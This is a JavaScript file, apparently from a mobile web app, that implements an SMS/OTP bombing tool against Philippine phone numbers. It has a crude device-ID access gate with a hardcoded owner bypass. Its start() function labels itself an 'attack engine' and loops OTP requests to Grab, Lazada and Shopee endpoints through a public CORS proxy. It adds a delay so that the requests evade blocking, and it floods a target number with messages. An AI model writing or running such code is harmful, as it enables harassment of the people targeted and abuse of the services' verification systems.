async function checkAccess() {
    const { identifier } = await Capacitor.Plugins.Device.getId();
    const deviceId = identifier;
    const expectedKey = deviceId + "JARED";

    // 1. Owner Bypass (Ikaw ito)
    if (deviceId === "a6604ff06fa2e862") {
        document.getElementById('main-app-interface').style.display = 'block';
        return;
    }

    // 2. Persistent Login Check
    if (localStorage.getItem("user_access_token") === expectedKey) {
        document.getElementById('main-app-interface').style.display = 'block';
        return;
    }

    // 3. Forced English Login Prompt
    const userKey = prompt("DEVICE ID: " + deviceId + "\n\nAccess Restricted! Please enter your Access Key to unlock the application:");

    if (userKey === expectedKey) {
        localStorage.setItem("user_access_token", userKey);
        alert("ACCESS GRANTED: Welcome to the application.");
        document.getElementById('main-app-interface').style.display = 'block';
    } else {
        alert("ACCESS DENIED: Invalid key. Please contact the administrator for access.");
        window.location.href = "https://www.facebook.com/jaredvxx";
    }
}

window.onload = checkAccess;

async function start() {
    const num = document.getElementById('num').value;
    const amount = document.getElementById('otpAmount').value;
    const log = document.getElementById('log');

    if(!num || num.length < 10) {
        alert("INPUT ERROR: Please enter a valid 10-digit number.");
        return;
    }

    log.innerHTML = "[+] ATTACK ENGINE INITIALIZED...<br>";

    // ETO NA YUNG MGA API LINKS (REAL SENDING)
    const apis = [
        "https://api.allorigins.win/get?url=" + encodeURIComponent("https://api.grab.com/otp/send?phone=63" + num),
        "https://api.allorigins.win/get?url=" + encodeURIComponent("https://member.lazada.com.ph/user/api/sendOtp?phone=" + num),
        "https://api.allorigins.win/get?url=" + encodeURIComponent("https://api.shopee.ph/api/v2/login/otp/send?phone=" + num)
    ];

    for(let i=1; i<=amount; i++) {
        // Pumipili ng random API sa listahan
        const randomApi = apis[Math.floor(Math.random() * apis.length)];
        
        log.innerHTML += "[SENDING] OTP Request #" + i + " to +63" + num + "...<br>";
        
        try {
            const response = await fetch(randomApi);
            if(response.ok) {
                log.innerHTML += "<span style='color: #0f0;'>[SUCCESS] Packet Delivered!</span><br>";
            } else {
                log.innerHTML += "<span style='color: #f00;'>[FAILED] Server Busy.</span><br>";
            }
        } catch (e) {
            log.innerHTML += "<span style='color: #f00;'>[ERROR] Connection Timeout.</span><br>";
        }

        log.scrollTop = log.scrollHeight;
        // 2 seconds delay para hindi agad ma-block
        await new Promise(r => setTimeout(r, 2000));
    }
    log.innerHTML += "[!] TASK FINISHED: All requests processed.<br>";
}
